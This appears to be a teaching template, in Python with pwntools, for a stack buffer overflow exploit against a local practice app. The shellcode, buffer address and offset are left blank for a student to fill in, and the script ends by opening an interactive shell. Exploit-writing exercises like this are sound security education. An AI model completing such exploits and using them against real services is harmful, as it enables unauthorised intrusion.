#!/usr/bin/python3
import socket
import os
import sys
import struct
from pwn import *

# compile the shellcode and dump it as raw hex bytes
# then insert the raw hex bytes into this python string
shellcode=b""

# use gdb to find the address of the buffer we're overflowing
# then insert that address here in integer format
target_buf=0x0

# dissassemble the HelloApp code to figure out the
# offset of the return address relative to the beginning
# of the target buffer. Then insert that offset here
ret_addr_offset=0x0
    
if len(sys.argv) < 2:
    print("Syntax: %s <port num>" % __file__)
    exit(-1)

# use pwntools to set up a connection to the app running under netcat
sock = remote("127.0.0.1", int(sys.argv[1]))

# wait for the server to send the greeting message
print("got " + sock.recv(1024).decode("utf-8"))

# construct and send our shellcode
# we pad our shellcode with 'x' bytes so we can inject the shellcode AND
# overwrite the return address with one overflow
sock.send(shellcode +
                  # these are our padding bytes
                  (b"x" * (ret_addr_offset - len(shellcode))) + 
                  # this is the return address we're writing
                  # we use pack("<Q") to ensure that:
                  # * the return address we inject is 64 bits long (Q)
                  # * we use little-endian byte ordering
                  struct.pack("<Q", target_buf) +
                  # we end with a line return to finish the scanf
                  b"\n")

# put the socket in interactive mode so we can type into the remote shell
print("going interactive. Type CTRL+C to exit")
sock.interactive()
